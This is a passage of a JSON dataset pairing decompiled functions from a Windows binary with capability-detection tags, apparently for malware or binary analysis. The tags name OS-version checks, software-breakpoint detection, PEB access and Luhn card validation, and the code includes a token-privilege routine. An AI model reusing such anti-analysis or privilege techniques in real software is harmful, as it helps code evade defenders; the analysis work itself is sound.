        "token_count": 397
    },
    "00416688": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416688(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    uint8_t uVar4;\n    \n    pcVar1 = **param_2;\n    uVar4 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar4 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar2 & 0xffffff);\n        *puVar3 = param_1;\n        if ((1 < uVar4) && (*puVar3 = param_1,  3 < uVar4)) {\n            *puVar3 = param_1;\n        }\n    }\n    else if (*(param_2 + 0xb) < 0xfe) {\n        (*pcVar2)();\n    }\n    else {\n        (**(pcVar2 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "00420c34": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420c34(int32_t arg_8h, uint arg_ch, uint noname_2, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x420c9e;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    if ((arg_14h < 0) || (2 < arg_14h)) {\n        uVar2 = 0x80030001;\n        *in_FS_OFFSET = uStack36;\n    }\n    else {\n        iVar1 = (**(**(arg_8h + 0xc) + 0x14))();\n        if (arg_18h != NULL) {\n            *arg_18h = iVar1;\n            arg_18h[1] = iVar1 >> 0x1f;\n        }\n        uVar2 = 0;\n        *in_FS_OFFSET = uStack36;\n    }\n    return uVar2;\n}\n",
        "token_count": 285
    },
    "0042600c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042600c(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    param_2 = param_2 + -1;\n    if (-1 < param_2) {\n        if (**0x494bfc < 3) {\n            do {\n                uVar1 = *(in_EAX + param_2 * 4);\n                *(in_EAX + param_2 * 4) = uVar1 >> 0x10 & 0xff | CONCAT11(uVar1, uVar1 >> 8) << 8;\n                param_2 = param_2 + -1;\n            } while (-1 < param_2);\n        }\n        else {\n            do {\n                uVar1 = *(in_EAX + param_2 * 4);\n                *(in_EAX + param_2 * 4) = ((uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18) >> 8;\n                param_2 = param_2 + -1;\n            } while (-1 < param_2);\n        }\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "00437ae0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00437ae0(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    uVar7 = 0;\n    piVar4 = fcn.00437a24();\n    if (piVar4 == NULL) {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            cVar3 = fcn.004047dc();\n            if (cVar3 != '\\0') {\n                fcn.00436acc();\n            }\n        }\n    }\n    else {\n        if ((*(piVar4 + 7) & 0x10) == 0) {\n            fcn.00436acc();\n        }\n        (**(*piVar4 + 0x44))();\n        uVar5 = fcn.0043718c();\n        uVar2 = fcn.00437674();\n        if ((uVar5 | uVar2) != 0) {\n            fcn.00434924();\n        }\n        uVar1 = *(**0x494b0c + 0x44);\n        uVar5 = uVar5 & 0xffffff00;\n        if (((uVar1 != 0) && (uVar5 = uVar1,  *(uVar1 + 0x277) == '\\x02')) && (piVar4 == *(uVar1 + 0x2a0))) {\n            iVar6 = sub.user32.dll_SendMessageA(*(uVar1 + 0x29c), 0x234, 0, 0);\n            if (iVar6 != 0) {\n                uVar7 = fcn.004585f8();\n                sub.user32.dll_DrawMenuBar(uVar7);\n            }\n        }\n        uVar7 = CONCAT31(uVar5 >> 8, 1);\n    }\n    return uVar7;\n}\n",
        "token_count": 450
    },
    "0043ebd8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043ebd8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0043f528();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0043f574();\n            if (*(iVar2 + 0x273) == '\\x02') {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 125
    },
    "0043fd18": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0043fd18(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0xff000005;\n    if (*(in_EAX + 0x277) == '\\x02') {\n        uVar1 = 0xff00000c;\n    }\n    return uVar1;\n}\n",
        "token_count": 77
    },
    "0044e1fc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044e1fc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint lParam;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0;\n    if (in_EAX != 0) {\n        uVar1 = sub.user32.dll_SendMessageA();\n    }\n    return uVar1;\n}\n",
        "token_count": 116
    },
    "00474e94": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00474e94(code **arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    \n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0xd]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[3] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xc], arg_8h[0xe]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[2] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0xf]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[4] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0x10]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[5] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0x11]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[6] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0x12]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[7] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0x15]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[8] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0x13]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[9] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0x14]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[10] = pcVar3;\n    while( true ) {\n        cVar1 = (*arg_8h[5])(arg_8h[0x17]);\n        if (cVar1 != '\\0') break;\n        iVar4 = (*arg_8h[6])();\n        if (iVar4 == 2) break;\n        (*arg_8h[3])(500);\n    }\n    iVar4 = (*arg_8h[9])(1, 0, arg_8h[0x16]);\n    if (iVar4 != 0) {\n        (*arg_8h[10])(iVar4);\n        (*arg_8h[7])(iVar4);\n        (*arg_8h[8])(iVar4);\n        (*arg_8h[4])(0);\n    }\n    return;\n}\n",
        "token_count": 731
    },
    "0048aea8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048aea8(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff6c;\n    uint uStack112;\n    uint uStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint var_1ch;\n    uint uStack28;\n    uint var_14h;\n    uint var_10h;\n    uint TokenHandle;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    puStack68 = 0x48aebe;\n    fcn.004059cc();\n    uStack72 = 0x48afd6;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    uStack84 = 0x48afaf;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    var_5h = true;\n    if (**0x494d14 == 2) {\n        var_5h = 0;\n        puStack92 = &fcn.0048aea8::TokenHandle;\n        uStack96 = 0x28;\n        uStack100 = 0x48af04;\n        puStack68 = &stack0xfffffffc;\n        uStack100 = sub.kernel32.dll_GetCurrentProcess();\n        puStack104 = 0x48af0a;\n        iVar1 = sub.advapi32.dll_OpenProcessToken();\n        if (iVar1 != 0) {\n            uStack108 = 0x48af93;\n            uStack112 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff90;\n            puStack104 = &stack0xfffffffc;\n            uVar2 = fcn.004059dc(&fcn.0048aea8::var_1ch);\n            iVar1 = sub.advapi32.dll_LookupPrivilegeValueA(0, uVar2);\n            if (iVar1 != 0) {\n                var_20h = 1;\n                if (param_2 == '\\0') {\n                    var_14h = 0;\n                }\n                else if (param_2 == '\\x01') {\n                    var_14h = 2;\n                }\n                var_10h = 0;\n                var_30h = 1;\n                uStack48 = var_1ch;\n                uStack44 = uStack28;\n                uStack40 = var_14h;\n                in_stack_ffffff6c = TokenHandle;\n                sub.advapi32.dll_AdjustTokenPrivileges\n                          (TokenHandle, 0, &fcn.0048aea8::var_20h, 0x10, &fcn.0048aea8::var_30h, &fcn.0048aea8::var_10h)\n                ;\n            }\n            *in_FS_OFFSET = in_stack_ffffff6c;\n            sub.kernel32.dll_CloseHandle_1(TokenHandle, 0x48af9a);\n            return;\n        }\n        puStack104 = 0x48af9f;\n        iVar1 = sub.kernel32.dll_GetLastError_1();\n        var_5h = iVar1 == 0;\n        *in_FS_OFFSET = uStack100;\n    }\n    else {\n        *in_FS_OFFSET = uStack88;\n        puStack68 = &stack0xfffffffc;\n    }\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x48afdd;\n    uStack84 = 0x48afd5;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 877
    },
    "004220f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nulong fcn.004220f4(void)\n\n{\n    uchar *arg_8h;\n    uint uVar1;\n    uchar auStack8 [4];\n    \n    uVar1 = 4;\n    arg_8h = auStack8;\n    fcn.004221f0(arg_8h, 4);\n    if (uVar1 != '\\x03') {\n        fcn.0042162c();\n    }\n    return CONCAT44(uVar1, arg_8h);\n}\n",
        "token_count": 106
    },
    "00454308": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.00454308(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_5h;\n    \n    puStack32 = 0x45431f;\n    iVar1 = fcn.004546e8();\n    if (iVar1 == 0) {\n        return;\n    }\n    puStack32 = 0x454333;\n    iVar1 = fcn.00404620();\n    puStack32 = 0x45433e;\n    fcn.00454204();\n    uStack36 = 0x4543f6;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar2 = fcn.004546e8();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.004546ac();\n            if (*(iVar3 + 0x5b) - 3U < 2) {\n                fcn.004546ac();\n                fcn.00419740();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.0040484c();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x4543fd;\n    while (0 < *(iVar1 + 8)) {\n        uStack36 = 0x4543b0;\n        iVar2 = fcn.00419898();\n        if (*(iVar2 + 0x5b) == '\\x03') {\n            uStack36 = 0x4543c1;\n            fcn.0044fc18();\n        }\n        else {\n            uStack36 = 0x4543cc;\n            fcn.0044fc18();\n        }\n        uStack36 = 0x4543db;\n        fcn.0041978c();\n    }\n    uStack36 = 0x4543ed;\n    fcn.00404650();\n    uStack36 = 0x4543f5;\n    fcn.0045420c();\n    return;\n}\n",
        "token_count": 503
    },
    "004689c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004689c0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    char *pcVar2;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar3;\n    \n    pcVar4 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    pcVar5 = *(in_EAX + 0x34) + param_2;\n    if ((*pcVar5 == *pcVar4) && (pcVar5[1] == pcVar4[1])) {\n        pcVar5 = pcVar5 + 2;\n        pcVar3 = pcVar4 + 2;\n        while (((((pcVar2 = pcVar3 + 1,  *pcVar2 == pcVar5[1] && (pcVar2 = pcVar3 + 2,  *pcVar2 == pcVar5[2])) &&\n                 (pcVar2 = pcVar3 + 3,  *pcVar2 == pcVar5[3])) &&\n                ((pcVar2 = pcVar3 + 4,  *pcVar2 == pcVar5[4] && (pcVar2 = pcVar3 + 5,  *pcVar2 == pcVar5[5])))) &&\n               ((pcVar2 = pcVar3 + 6,  *pcVar2 == pcVar5[6] && (pcVar2 = pcVar3 + 7,  *pcVar2 == pcVar5[7]))))) {\n            pcVar2 = pcVar3 + 8;\n            pcVar5 = pcVar5 + 8;\n            if ((*pcVar2 != *pcVar5) || (pcVar3 = pcVar2,  pcVar4 + 0x102 <= pcVar2)) break;\n        }\n        uVar1 = 0x102 - ((pcVar4 + 0x102) - pcVar2);\n        if (uVar1 < 3) {\n            uVar1 = 2;\n        }\n        else {\n            *(in_EAX + 0x6c) = param_2;\n            if (*(in_EAX + 0x70) < uVar1) {\n                uVar1 = *(in_EAX + 0x70);\n            }\n        }\n    }\n    else {\n        uVar1 = 2;\n    }\n    return uVar1;\n}\n",
        "token_count": 541
    },
    "0048ceec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0048ceec(void)\n\n{\n    int32_t iVar1;\n    uchar auStack12 [8];\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1(0x400, 0x5a, auStack12, 5);\n    if (iVar1 == 3) {\n        fcn.00405728();\n    }\n    else {\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00405268": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.00405268(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = 0x10;\n    iVar1 = *0x491000;\n    do {\n        \"Runtime error     at 00000000\"[uVar2 & 0xff] = iVar1 % 10 + '0';\n        iVar1 = iVar1 / 10;\n        uVar2 = uVar2 - 1;\n    } while (iVar1 != 0);\n    uVar3 = 0x1c;\n    uVar2 = *0x491004;\n    do {\n        \"Runtime error     at 00000000\"[uVar3 & 0xff] = str.0123456789ABCDEF[uVar2 & 0xf];\n        uVar2 = uVar2 / 0x10;\n        uVar3 = uVar3 - 1;\n    } while (uVar2 != 0);\n    return;\n}\n",
        "token_count": 221
    },
    "00409d24": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00409d2e: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00409d33)\n\nvoid __fastcall fcn.00409d24(uint32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    char cVar4;\n    \n    puVar6 = unaff_ESI;\n    if (param_1 == '\\0') {\n        if (in_EAX < 0) {\n            in_EAX = -in_EAX;\n        }\n        param_1 = 10;\n    }\n    do {\n        uVar2 = in_EAX / param_1;\n        puVar6 = puVar6 + -1;\n        cVar4 = in_EAX % param_1;\n        uVar3 = cVar4 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = cVar4 + 0x37;\n        }\n        *puVar6 = uVar3;\n        in_EAX = uVar2;\n    } while (uVar2 != 0);\n    iVar5 = param_2 - (unaff_ESI - puVar6);\n    if (unaff_ESI - puVar6 <= param_2 && iVar5 != 0) {\n        iVar1 = -iVar5;\n        while (iVar5 = iVar5 + -1,  iVar5 != 0) {\n            (puVar6 + iVar1)[iVar5] = 0x30;\n        }\n        puVar6[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 402
    },
    "0040b088": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040b088(int32_t param_1, uint32_t param_2)\n\n{\n    char cVar2;\n    uint in_EAX;\n    uint32_t uVar1;\n    char unaff_BL;\n    uint32_t *puVar3;\n    uchar *unaff_EDI;\n    char *pcVar4;\n    uint32_t uStack8;\n    \n    *unaff_EDI = in_EAX;\n    if (unaff_BL == '\\0') {\n        param_2 = 0;\ncode_r0x0040b09e:\n        cVar2 = in_EAX >> 8;\n        pcVar4 = unaff_EDI + 1;\n        if (cVar2 == '\\0') goto code_r0x0040b0a5;\n    }\n    else {\n        if (-1 < param_2) goto code_r0x0040b09e;\n        cVar2 = '-';\n        param_2 = -param_2;\n    }\n    pcVar4 = unaff_EDI + 2;\n    unaff_EDI[1] = cVar2;\ncode_r0x0040b0a5:\n    puVar3 = &uStack8;\n    uStack8 = param_2;\n    do {\n        do {\n            uVar1 = param_2 / *0x49188c;\n            *puVar3 = param_2 % *0x49188c + '0';\n            puVar3 = puVar3 + 1;\n            param_1 = param_1 + -1;\n            param_2 = uVar1;\n        } while (uVar1 != 0);\n    } while (0 < param_1);\n    do {\n        puVar3 = puVar3 + -1;\n        *pcVar4 = *puVar3;\n        pcVar4 = pcVar4 + 1;\n    } while (puVar3 != &uStack8);\n    return uStack8;\n}\n",
        "token_count": 427
    },
    "0040b4ef": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b4ef(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar7;\n    uint16_t uVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    int16_t *unaff_EBX;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t iVar11;\n    int16_t *piVar12;\n    int16_t *piVar13;\n    bool bVar14;\n    float10 fVar15;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    uVar6 = *unaff_ESI;\n    uVar10 = unaff_ESI[1];\n    if ((uVar6 | uVar10) != 0) {\n        if (uVar10 < 0) {\n            bVar14 = uVar6 != 0;\n            uVar6 = -uVar6;\n            uVar10 = -bVar14 - uVar10;\n        }\n        iVar8 = 0;\n        iVar11 = *(unaff_EBP + 8);\n        if (iVar11 < 0) {\n            iVar11 = 0;\n        }\n        if (3 < iVar11) {\n            iVar11 = 4;\n            uVar2 = uVar6;\n            iVar3 = iVar8;\n            do {\n                iVar8 = iVar3;\n                uVar6 = uVar2;\n                bVar14 = 0xde0b6b2 < uVar10;\n                uVar1 = uVar10 + 0xf21f494d;\n                uVar10 = uVar1 - (uVar6 < 0xa7640000);\n                uVar2 = uVar6 + 0x589c0000;\n                iVar3 = iVar8 + 1;\n            } while (bVar14 && (uVar6 < 0xa7640000) <= uVar1);\n            uVar10 = uVar10 + 0xde0b6b3 + (0x589bffff < uVar6 + 0x589c0000);\n        }\n        *(unaff_EBP + -0x20) = uVar6;\n        *(unaff_EBP + -0x1c) = uVar10;\n        fVar15 = *(unaff_EBP + -0x20);\n        if (4 - iVar11 != 0) {\n            fVar15 = fVar15 / *(*(unaff_EBP + -4) + 0x40b4db + (4 - iVar11) * 4);\n        }\n        *(unaff_EBP + -0x18) = fVar15;\n        piVar12 = unaff_EBX + 3;\n        if (iVar8 != 0) {\n            piVar13 = unaff_EBX + 2;\n            *piVar12 = iVar8 + '0';\n            iVar8 = 9;\n            goto code_r0x0040b586;\n        }\n        iVar8 = 9;\n        do {\n            uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n            uVar4 = CONCAT11(uVar9, uVar9 >> 4);\n            piVar13 = piVar12;\n            if (uVar9 >> 4 != 0) goto code_r0x0040b58f;\n            uVar7 = uVar4 >> 8;\n            if ((uVar9 & 0xf) != 0) goto code_r0x0040b596;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n    }\n    iVar5 = 0;\n    uVar9 = 0;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040b5bc:\n    *unaff_EBX = iVar5;\n    *(unaff_EBX + 1) = uVar9;\n    return;\ncode_r0x0040b596:\n    while( true ) {\n        piVar13 = piVar12 + 1;\n        *piVar12 = (uVar7 & 0xf) + 0x30;\n        iVar8 = iVar8 + -1;\n        if (iVar8 == 0) break;\ncode_r0x0040b586:\n        uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n        uVar4 = CONCAT11(uVar9, uVar9 >> 4);\ncode_r0x0040b58f:\n        uVar7 = uVar4 >> 8;\n        piVar12 = piVar13 + 1;\n        *piVar13 = uVar4 + '0';\n    }\n    iVar5 = piVar13 - (unaff_EBX + 3 + iVar11);\n    do {\n        *piVar13 = '\\0';\n        piVar13 = piVar13 + -1;\n    } while (*piVar13 == '0');\n    uVar9 = unaff_ESI[1] >> 0x1f;\n    goto code_r0x0040b5bc;\n}\n",
        "token_count": 1155
    },
    "004449c4": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004449c4(void)\n\n{\n    fcn.0040f944();\n    return;\n}\n",
        "token_count": 25
    },
    "0040a7bc": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a7bc(uint arg_8h, uint arg_ch)\n\n{\n    uint var_12h;\n    int16_t var_eh;\n    int16_t var_ch;\n    uint var_ah;\n    uint16_t var_6h;\n    uint var_4h;\n    \n    fcn.0040bbe0(arg_8h, arg_ch);\n    if ((var_6h < 0x7bc) || (0x83b < var_6h)) {\n        var_4h = 0;\n    }\n    else {\n        fcn.0040b900(&var_12h, arg_8h, arg_ch);\n        var_4h = CONCAT22(var_ah._2_2_ << 5 | var_ah | (var_6h - 0x7bc) * 0x200, \n                          var_12h._2_2_ >> 1 | var_eh << 5 | var_ch << 0xb);\n    }\n    return var_4h;\n}\n",
        "token_count": 238
    },
    "00419d9c": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00419d9c(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    int32_t iStack16;\n    \n    iVar1 = *(in_EAX + 4) + 0x1f;\n    if (iVar1 < 0) {\n        iVar1 = *(in_EAX + 4) + 0x3e;\n    }\n    iStack16 = param_1;\n    if (-1 < (iVar1 >> 5) + -1) {\n        iVar3 = 0;\n        iStack16 = iVar1 >> 5;\n        do {\n            if (*0x419e10 != *(*(in_EAX + 8) + iVar3 * 4)) {\n                uVar2 = 0;\n                do {\n                    bVar4 = uVar2 < 0x1f;\n                    if (uVar2 < 0x20) {\n                        bVar4 = (*(*(in_EAX + 8) + iVar3 * 4) >> (uVar2 & 0x1f) & 1) != 0;\n                    }\n                    if (!bVar4) {\n                        iVar1 = iVar3 * 0x20 + (uVar2 & 0x7f);\n                        if (*(in_EAX + 4) <= iVar1) {\n                            iVar1 = *(in_EAX + 4);\n                        }\n                        goto code_r0x00419e08;\n                    }\n                    uVar2 = uVar2 + 1;\n                } while (uVar2 != ' ');\n            }\n            iVar3 = iVar3 + 1;\n            iStack16 = iStack16 + -1;\n        } while (iStack16 != 0);\n    }\n    iVar1 = *(in_EAX + 4);\ncode_r0x00419e08:\n    return CONCAT44(iStack16, iVar1);\n}\n",
        "token_count": 435
    },
    "0045ec78": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045ec78(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    uVar3 = in_EAX[1];\n    uVar4 = in_EAX[2];\n    uVar1 = in_EAX[3];\n    uVar2 = *in_EAX + *param_2 + *0x4927b0 + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x80 | uVar2 >> 0x19) + uVar3;\n    uVar1 = uVar1 + param_2[1] + *0x4927b4 + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar2;\n    uVar4 = uVar4 + param_2[2] + *0x4927b8 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar5 = (uVar4 * 0x20000 | uVar4 >> 0xf) + uVar1;\n    uVar3 = uVar3 + param_2[3] + *0x4927bc + ((uVar2 ^ uVar1) & uVar5 ^ uVar2);\n    uVar6 = (uVar3 * 0x400000 | uVar3 >> 10) + uVar5;\n    uVar2 = uVar2 + param_2[4] + *0x4927c0 + ((uVar1 ^ uVar5) & uVar6 ^ uVar1);\n    uVar4 = (uVar2 * 0x80 | uVar2 >> 0x19) + uVar6;\n    uVar1 = uVar1 + param_2[5] + *0x4927c4 + ((uVar5 ^ uVar6) & uVar4 ^ uVar5);\n    uVar3 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar4;\n    uVar5 = uVar5 + param_2[6] + *0x4927c8 + ((uVar6 ^ uVar4) & uVar3 ^ uVar6);\n    uVar2 = (uVar5 * 0x20000 | uVar5 >> 0xf) + uVar3;\n    uVar6 = uVar6 